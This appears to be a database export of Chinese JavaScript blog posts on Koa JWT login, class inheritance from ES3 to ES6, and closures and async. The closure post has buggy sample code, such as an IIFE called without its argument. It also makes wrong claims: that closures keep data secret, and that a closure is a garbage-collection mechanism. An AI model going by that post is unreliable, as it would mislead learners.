class=\"hljs-attr\"\u003eusername\u003c/span\u003e: body.username });\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!user) {\n        ctx.status = \u003cspan class=\"hljs-number\"\u003e401\u003c/span\u003e\n        ctx.body = {\n          \u003cspan class=\"hljs-attr\"\u003emessage\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'用户名错误'\u003c/span\u003e,\n        }\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e;\n      }\n      \u003cspan class=\"hljs-comment\"\u003e// 匹配密码是否相等\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e bcrypt.compare(body.password, user.password)) {\n        ctx.status = \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e\n        ctx.body = {\n          \u003cspan class=\"hljs-attr\"\u003emessage\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'登录成功'\u003c/span\u003e,\n          \u003cspan class=\"hljs-attr\"\u003euser\u003c/span\u003e: user.userInfo,\n          \u003cspan class=\"hljs-comment\"\u003e// 生成 token 返回给客户端\u003c/span\u003e\n          token: jsonwebtoken.sign({\n            \u003cspan class=\"hljs-attr\"\u003edata\u003c/span\u003e: user,\n            \u003cspan class=\"hljs-comment\"\u003e// 设置 token 过期时间\u003c/span\u003e\n            exp: \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.floor(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() / \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e) + (\u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e * \u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e), \u003cspan class=\"hljs-comment\"\u003e// 60 seconds * 60 minutes = 1 hour\u003c/span\u003e\n          }, secret),\n        }\n      } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        ctx.status = \u003cspan class=\"hljs-number\"\u003e401\u003c/span\u003e\n        ctx.body = {\n          \u003cspan class=\"hljs-attr\"\u003emessage\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'密码错误'\u003c/span\u003e,\n        }\n      }\n    } \u003cspan class=\"hljs-keyword\"\u003ecatch\u003c/span\u003e (error) {\n      ctx.throw(\u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e)\n    }\n  }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e需要注意的是，在使用 \u003ccode\u003ejsonwebtoken.sign()\u003c/code\u003e 时，需要传入的 \u003ccode\u003esecret\u003c/code\u003e 参数，这里的 \u003ccode\u003esecret\u003c/code\u003e 必须要与 前面设置  \u003ccode\u003ejwt()\u003c/code\u003e 中的 \u003ccode\u003esecret\u003c/code\u003e 一致。\u003c/p\u003e\n\u003cp\u003e更多关于 \u003ccode\u003ejsonwebtoken\u003c/code\u003e 的方法，可见：\u003ca href=\"https://github.com/auth0/node-jsonwebtoken\"\u003ehttps://github.com/auth0/node-jsonwebtoken\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e在登录后，拿着返回的 token，这时候去访问 \u003ccode\u003e/api/users\u003c/code\u003e，就能正确获得用户列表。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ecurl -X GET http://localhost:3200/api/users -H \u003cspan class=\"hljs-string\"\u003e'authorization: Bearer token'\u003c/span\u003e -H \u003cspan class=\"hljs-string\"\u003e'cache-control: no-cache'\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e","buildTime":"1514970757.2866","__v":0}
{"_id":{"$oid":"5a4cc36703f84016f04fabdb"},"id":"5a4852886fb9a04503106e46","author":{"$oid":"5a4cc36603f84016f04fabc9"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"JavaScript 中的继承：ES3、ES5 和 ES6","meta":{"likeCount":0},"tag":["JavaScript","Java","前端","设计"],"comment":[],"shortContent":"JavaScript 是一门动态语言，动态意味着高灵活性，而这尤其可以体现在继承上面。JavaScript 中的继承有很多种实现方式，可以分成下面四类： 前三种有一个共同点，就是没有“类”的概念，它们在适当的场景下非常有用，不过也因为没有类，缺失了很多经典面向对象继承的要素。例…","content":"\u003ch2 class=\"heading\"\u003e选择一种继承方式\u003c/h2\u003e\n\u003cp\u003eJavaScript 是一门动态语言，动态意味着高灵活性，而这尤其可以体现在继承上面。JavaScript 中的继承有很多种实现方式，可以分成下面四类：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eMixin 模式，即属性混入，从一个或多个对象中复制属性到新的对象中\u003c/li\u003e\n\u003cli\u003e方法借用模式，即通过 call 或 apply 实现方法的重用\u003c/li\u003e\n\u003cli\u003e原型模式，使用 Object.create 方法直接以一个对象为原型创造新的对象\u003c/li\u003e\n\u003cli\u003e类模式，实际上是使用构造函数或 ES6 class\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e前三种有一个共同点，就是没有“类”的概念，它们在适当的场景下非常有用，不过也因为没有类，缺失了很多经典面向对象继承的要素。例如父子对象之间没有严格的传承关系，即不一定是 is-a 的关系，这决定了无法将它们直接应用在面向对象分析与设计方面，可以说它们并不是真正的继承，而是介于继承和组合之间的代码复用方案。\u003c/p\u003e\n\u003cp\u003e而第四种，类式继承，无论是使用构造函数还是 ES6 加入的 class，都能表达明确的继承关系，在需要对继承重度使用的场景下，应该使用类式继承。接下来，本文讨论的都是类式继承。\u003c/p\u003e\n\u003cp\u003e有一点需要牢记：继承是一种强耦合，应该谨慎使用。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e如何学习 JavaScript 中的继承\u003c/h2\u003e\n\u003cp\u003e理解 JavaScript 里面的类继承实现方式，我认为最好的方法是——找一门面向对象机制更为完善的语言，去理解其中的继承。实际上，JavaScript 中以前就有的 new 和 ES6 加入的 class，都是参考自 Java 语言。\u003c/p\u003e\n\u003cp\u003e不过，这样的对照学习是有前提条件的，即首先掌握 JavaScript 中的原型、原型链和作用域，否则很容易误解 JavaScript 本质的执行机制。如果已经理解了这些前置知识，就可以探索一下 JavaScript 中的继承了。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e用 ES3 实现继承\u003c/h2\u003e\n\u003cp\u003e实现要点：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e利用 Person.call(this) 执行“方法借用”，获取 Person 的属性\u003c/li\u003e\n\u003cli\u003e利用一个空函数将 Person.prototype 加入原型链\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ePerson\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ename\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name = name;\n}\n\nPerson.prototype.printName = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name);\n};\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eBob\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  Person.call(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"Bob\"\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.hobby = \u003cspan class=\"hljs-string\"\u003e\"Histroy\"\u003c/span\u003e;\n}\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003einheritProto\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eParent, Child\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e Fn = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{};\n  Fn.prototype = Parent.prototype;\n  Child.prototype = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Fn();\n  Child.prototype.constructor = Child;\n}\n\ninheritProto(Person, Bob);\n\nBob.prototype.printHobby = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.hobby);\n};\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.dir(\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Bob());\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003edir 输出：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eBob\n  |-- hobby:\"Histroy\"\n  |-- name:\"Bob\"\n  |-- __proto__:Person\n      |-- printHobby:ƒ ()\n      |-- constructor:ƒ Bob()\n      |-- __proto__:\n          |-- printName:ƒ ()\n          |-- constructor:ƒ Person(name)\n          |-- __proto__:Object\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 class=\"heading\"\u003e用 ES5 实现继承\u003c/h2\u003e\n\u003cp\u003e实现要点：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e利用 Person.call(this) 执行“方法借用”，获取 Person 的属性\u003c/li\u003e\n\u003cli\u003e利用 ES5 增加的 Object.create 方法将 Person.prototype 加入原型链\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ePerson\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ename\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name = name;\n}\n\nPerson.prototype.printName = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name);\n};\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eBob\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  Person.call(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"Bob\"\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.hobby = \u003cspan class=\"hljs-string\"\u003e\"Histroy\"\u003c/span\u003e;\n}\n\nBob.prototype  = \u003cspan class=\"hljs-built_in\"\u003eObject\u003c/span\u003e.create(Person.prototype, {\n  \u003cspan class=\"hljs-attr\"\u003econstructor\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003evalue\u003c/span\u003e: Bob,\n    \u003cspan class=\"hljs-attr\"\u003eenumerable\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003econfigurable\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003ewritable\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n  }\n});\n\nBob.prototype.printHobby = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.hobby);\n};\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.dir(\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Bob());\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003edir 输出：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eBob\n  |-- hobby:\"Histroy\"\n  |-- name:\"Bob\"\n  |-- __proto__:Person\n      |-- printHobby:ƒ ()\n      |-- constructor:ƒ Bob()\n      |-- __proto__:\n          |-- printName:ƒ ()\n          |-- constructor:ƒ Person(name)\n          |-- __proto__:Object\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 class=\"heading\"\u003e用 ES6 实现继承\u003c/h2\u003e\n\u003cp\u003e实现要点：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e利用 ES6 增加的 class 和 extends 实现比以前更完善的继承\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ePerson\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(name) {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name = name;\n  }\n\n  printName() {\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name);\n  }\n}\n\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eBob\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ePerson\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e() {\n    \u003cspan class=\"hljs-keyword\"\u003esuper\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Bob\"\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.hobby = \u003cspan class=\"hljs-string\"\u003e\"Histroy\"\u003c/span\u003e;\n  }\n\n  printHobby() {\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.hobby);\n  }\n}\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.dir(\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Bob());\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003edir 输出：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eBob\n  |-- hobby:\"Histroy\"\n  |-- name:\"Bob\"\n  |-- __proto__:Person\n      |-- constructor:class Bob\n      |-- printHobby:ƒ printHobby()\n      |-- __proto__:\n          |-- constructor:class Person\n          |-- printName:ƒ printName()\n          |-- __proto__:Object\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 class=\"heading\"\u003e从 class 和 super 看 JavaScript 与 Java 的继承\u003c/h2\u003e\n\u003cp\u003e编写代码时，ES6 class 带来的最明显的两个便利是：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e隐藏原型链的拼接过程，将代码的重点放在类型之间的传承\u003c/li\u003e\n\u003cli\u003e使用 super 来实现更简化、更灵活的多态方法\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e实际上，ES6 围绕 class 增加了很多新功能，比如继承这件事情上，与之前不同的是：用 class 实现的继承，既包括类实例的继承关系，也包括类本身的继承关系。这里的类其实是特殊的 JavaScript 函数，而在 JavaScript 中，函数是对象的子类型，即函数对象，所以也能够体现出原型继承。\u003c/p\u003e\n\u003cp\u003e例如，用前面的代码来说明就是：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 类实例的继承关系\u003c/span\u003e\nBob.prototype.__proto__ === Person.prototype \u003cspan class=\"hljs-comment\"\u003e// true\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e// 类本身的继承关系\u003c/span\u003e\nBob.__proto__ === Person \u003cspan class=\"hljs-comment\"\u003e// true\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e再来看 ES6 中的 super，子类的方法想借助父类的方法完成一部分工作时，super 就可以派上用场了，这是比继承更为细粒度的代码复用，不过耦合性也也变得更强了。实际上 super 也有很多功能，既可以当作函数使用，也可以当作对象使用。将 class 和 super 结合起来看，就可以领会一下 JavaScript 与 Java 在继承上的异同了。\u003c/p\u003e\n\u003cp\u003e与 Java 相同或非常类似的是：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e在子类构造方法中调用父类的构造方法。ES6 中，子类的构造器中必须调用父类的构造器来完成初始化，子类的实例是基于父类实例的加工。正是因此，父类的所有行为都可以继承。所以，ES6 中可以继承原生数据结构的完整功能，在此基础上定义自己的数据结构。就像 Java 中继承 HashMap 类，JavaScript 可以继承 Number、Array 等构造函数。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e与 Java 不同的是：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e在普通方法中，super 可以调用的是父类的原型对象上的方法（可以理解为 super 此时指向父类的原型对象）；在静态方法中，super 可以调用父类的静态方法（可以理解为 super 此时指向父类）。而在 Java 中，通过 super 可以访问父类中被覆盖的同名变量或者方法，要访问静态方法则是通过“类名.方法名”或“对象名.方法名”。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e比较后可见，真的是和 Java 非常类似。\u003c/p\u003e\n\u003cp\u003e结合前面的内容，可以发现从 ES3 到 ES6，JavaScript 中的面向对象部分一直是在向 Java 靠拢的。尤其增加了 class 和 extends 关键字之后，靠拢了一大步。但这些并没有改变 JavaScript 是基于原型这一实质。Java 中的类就像对象的设计图，每次调用 new 创建一个新的对象，就产生一个独立的对象占用独立的内存空间；而在 JavaScript，继承所做工作实际上是在构造原型链，所有子类的实例共享的是同一个原型。所以 JavaScript 中调用父类的方法实际上是在不同的对象上调用同一个方法，即“方法借用”，这种行为实际上是“委托（delegation）”调用。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e扩展阅读\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://es6.ruanyifeng.com/#docs/class-extends#super-%E5%85%B3%E9%94%AE%E5%AD%97\"\u003eECMAScript 6 入门：Class 的继承 - super 关键字\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 class=\"heading\"\u003e参考资料\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/jayli/javascript-patterns/blob/master/chapter6.markdown#%E7%B1%BB%E5%BC%8F%E7%BB%A7%E6%89%BF-vs-%E7%8E%B0%E4%BB%A3%E7%BB%A7%E6%89%BF%E6%A8%A1%E5%BC%8F\"\u003e《JavaScript模式》- 类式继承 vs 现代继承模式\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://www.ituring.com.cn/book/946\"\u003e《JavaScript高级程序设计（第3版）》- 面向对象的程序设计\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://www.ituring.com.cn/book/1488\"\u003e《你不知道的JavaScript》- this和对象原型\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n","buildTime":"1514976862.8641","__v":0}
{"_id":{"$oid":"5a4cc38785472a29ac40335c"},"id":"5a3e3cfdf265da431e16f802","author":{"$oid":"5a4cc38785472a29ac403347"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/23/160834f8c4db4145?w=721\u0026h=306\u0026f=png\u0026s=35478"],"screenShot":null}],"title":"浅谈闭包和异步","meta":{"likeCount":0},"tag":["JavaScript"],"comment":[],"shortContent":"今天我来说下我所理解的闭包。 首先闭包产生地条件：有两个。 2.变量在外面那个函数声明，在里面呢个函数调用。 是不是很神奇，就用了一个变量i。本来变量i for循环了就变成9（因为事件会产生异步）；嘿嘿嘿嘿....利用闭包，巧妙了实现了i值得再次利用 就这样写出来了。利用匿名函…","content":"\u003ch2\u003e把复杂的知识简单化------------------------------------------westlife\u003c/h2\u003e\u003cp\u003e引言-----你知道嫦娥为什么那么善变吗？？？ 因为chang er啊，哈哈哈哈！\u003c/p\u003e\u003cblockquote\u003e纵观js，有三座大山，这三座大山分别为--- 作用域/闭包 ， 原型,\u0026nbsp; 异步和单线程.难倒了一代又一代前端小白，小白发挥着愚公移山的精神，挠碎多少头发。伤害了多少神经元。。。。。\u003c/blockquote\u003e\u003cp\u003e今天我来说下我所理解的闭包。\u003cbr\u003e\u003c/p\u003e\u003cp\u003e首先闭包产生地条件：有两个。\u003c/p\u003e\u003cp\u003e1.函数嵌套函数\u003c/p\u003e\u003cp\u003e2.变量在外面那个函数声明，在里面呢个函数调用。\u003c/p\u003e\u003cp\u003e给大家看一个例子\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efoo\u003c/span\u003e\u003c/span\u003e(){\n    var a  = 10;\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n       \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e ++a\n    }\n}\nvar c = foo();\nconsole.log(c());\nconsole.log(c());\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e这就是一个简单的闭包，在浏览器调试器下可以看到分别打印了 11 12；\u003c/b\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e(ps：谢谢热心网友的矫正，错误已经改回来)\u003c/b\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e那么闭包有什么作用呢？\u003c/b\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e作用1：保存即将要被销毁的数据\u003c/b\u003e\u003c/p\u003e\u003cp\u003e举个小栗子：\u003c/p\u003e\u003cp\u003e大家记得做tab选项卡是怎么做的吗？恩，对，应该很多人都会做，无非就是找按钮的下标，找内容区域的下标，一一对应，for循环遍历按钮，点击按钮时，有事件了，所以产生了异步，for循环的i值不能对应到点击事件的i值，这里我们取巧了，给每个按钮都添加了下标，对应下标的内容区域显示出来，可是，存在一个问题，我们要在按钮组添加一个变量为index，如果我们不想要这个index，我们能不能用其他方法实现呢，答案是我们能，可以用es6的块级作用域来实现，当然我们也可以用闭包来实现\u003c/p\u003e\u003cp\u003e如图：通常实现tab选项卡的方法\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/23/160834f8c4db4145?w=721\u0026amp;h=306\u0026amp;f=png\u0026amp;s=35478\"\u003e\u003c/p\u003e\u003cp\u003e利用闭包来实现\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n    var wrap = document.querySelector(\u003cspan class=\"hljs-string\"\u003e'#wrap'\u003c/span\u003e);\n    var pic = document.querySelector(\u003cspan class=\"hljs-string\"\u003e'#wrap'\u003c/span\u003e);\n    var aBtn = wrap.getElementsByTagName(\u003cspan class=\"hljs-string\"\u003e'li'\u003c/span\u003e); //获取所有li组\n    var aPic = pic.getElementsByTagName(\u003cspan class=\"hljs-string\"\u003e'div'\u003c/span\u003e); //获取所有div组\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i = 0;i\u0026lt;aBtn.length;i++){\n       !\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(n){\n             aBtn[n].onclick = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n             aBtn[n].style.display = \u003cspan class=\"hljs-string\"\u003e'block'\u003c/span\u003e\n            }\n        }(i)\n    }\n}()\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e是不是很神奇，就用了一个变量i。本来变量i\u0026nbsp; \u0026nbsp;for循环了就变成9（因为事件会产生异步）；嘿嘿嘿嘿....利用闭包，巧妙了实现了i值得再次利用\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e作用2:保密\u003c/b\u003e\u003c/p\u003e\u003cp\u003edemo：写一段js代码，实现模拟汽车驾驶证科目一考试，做完一题，显示出答案的效果\u003c/p\u003e\u003cp\u003e想必大家思路是有的，把答案全放进一个数组里，数组的长度和题目的长度一样，数组了存放正确答案，当用户点击按钮时，在旁边显示的出此时此刻这个题目的答案，但是这样数据不安全啊，稍微懂点代码的人在控制台输出答案；怎么做到数据的保密性呢，--闭包\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e!\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\nvar aBtn = document.getElementsByClassName(\u003cspan class=\"hljs-string\"\u003e'btn'\u003c/span\u003e);//获取所有按钮\nvar arr = [\u003cspan class=\"hljs-string\"\u003e\"A\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"B\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"C\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"A\"\u003c/span\u003e...........]  //存放答案数\n\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i = 0;i\u0026lt;aBtn.length;i++){\n   !\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(n){\n        aBtn[n].onclick = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n            console.log(\u003cspan class=\"hljs-string\"\u003e\"正确答案是:\"\u003c/span\u003e+arr[n])\n        }\n    }()\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e就这样写出来了。利用匿名函数/立执行函数，数据不外泄，保密妥妥的，\u003c/p\u003e\u003cp\u003e其实说白了，闭包只是一种垃圾回收机制，有点像我们电脑中的回收站一样。变量声明要被销毁时，利用闭包可以收集即将被销毁的数据。\u003c/p\u003e\u003cp\u003e然后说下异步：上文也提及到了异步；我们的js代码是单线程执行的，从上到下执行；但是异步时候出现时。异步的执行代码会让同步的执行代码有限通过；就好比红绿灯一样，等红灯过去了我们才能通过，异步就是这样，等同步的代码执行完了才会通过，所以，同步总是优先于异步！\u003c/p\u003e\u003cp\u003e触发异步的条件\u003c/p\u003e\u003col\u003e\u003cli\u003eajax\u003c/li\u003e\u003cli\u003e事件\u003c/li\u003e\u003cli\u003esetTimeout() setInterval()\u003c/li\u003e\u003c/ol\u003e异步就将这么多，想听后续如何，请听下回分解！\u003cdiv\u003e\u003cblockquote\u003e\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; ___以上均为本人原创，如有纰漏，望能矫正。\u003c/blockquote\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003c/div\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","buildTime":"1514974862.6244","__v":0}
